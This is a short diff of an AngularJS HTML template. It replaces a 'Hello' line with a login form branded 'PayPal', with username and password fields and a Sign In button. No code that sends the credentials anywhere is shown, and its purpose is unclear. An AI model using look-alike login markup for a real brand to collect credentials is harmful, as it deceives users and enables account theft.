@@ -1,1 +1,22 @@
-<p>Hello </p>
+  <div class="login-wrap">
+	<div class="login-html">
+		<p class="paypal-logo paypal-logo-long">PayPal</p>
+		<div class="login-form">
+			<div>
+				<div class="group input-style">
+					<input id="user" type="text" ng-model="loginData.email" placeholder="Username" class="input">
+				</div>
+				<div class="group input-style">
+					<input id="pass" type="password" ng-model="loginData.password" placeholder="Password" class="input" data-type="password">
+				</div>
+				<div class="group button_spacing">
+					<input type="submit" ng-click="login()" class="button" value="Sign In">
+				</div>
+				<div>
+					<span style="text-align: left !important;"><a href="#forgot">Forgot Password?</a></span>
+					<span class="pull-right">or <a href="#/register" style="color:#0070ba;">create an account</a></span>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
